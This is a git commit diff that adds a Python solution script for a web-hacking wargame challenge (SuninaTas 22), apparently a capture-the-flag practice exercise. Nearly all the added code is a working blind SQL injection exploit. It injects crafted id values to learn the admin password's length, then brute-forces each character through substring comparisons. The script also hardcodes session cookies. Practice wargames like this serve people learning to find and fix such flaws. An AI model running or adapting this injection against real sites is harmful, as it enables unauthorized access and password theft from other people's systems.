259e75d4b2148ad43130851dd222773b525b4d02
Persian <kr.cs.project.59@gmail.com>
2020-12-21 21:21:50 +0900

    Mon 21 Dec 2020 09:21:50 PM KST

--- wargame/Python/SuninaTas_22.py
+++ wargame/Python/SuninaTas_22.py
@@ -2,9 +2,27 @@
 
 import requests as req
 
-cookies = {"ASP.NET_SessionId":"yknflzzx1htpmbhhuwcqjtai", "ASPSESSIONIDSADBSAQD":"LHAPHFIDIBDKMEFMGMJFJLPH"}
+cookies = {"ASP.NET_SessionId":"qrunna20jgtt2p3tprjyd4ie", "ASPSESSIONIDSADBSAQD":"NCOFJKBABPHPPPOKGCEEFANG"}
 url = "http://suninatas.com/challenge/web22/web22.asp"
 maxpass = 15
-response = req.get(url, cookies=cookies)
+length = 0
+password = ""
+parameter = {"pw":"haha"}
 
+for i in range(maxpass):
+    parameter['id']="admin' and len(pw)={}-- ".format(i+1)
+    response = req.get(url, cookies=cookies, params=parameter)
+
+    if response.text.find("OK") != -1:
+        length = i+1
+        print("Password length is {}".format(length))
+
+for i in range(1, length+1):
+    for j in range(32, 128):
+        parameter['id'] = "admin' and substring(pw, {0}, 1)='{1}'--".format(i, chr(j))
+        response = req.get(url, cookies=cookies, params=parameter)
+        if response.text.find("OK") != -1:
+            password += chr(j)
+
+print("admin's password is " + password)
 
